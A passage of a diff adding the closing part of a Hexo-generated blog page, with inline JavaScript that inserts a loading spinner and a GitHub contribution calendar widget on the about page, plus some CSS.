+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/about/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body>
+</html>
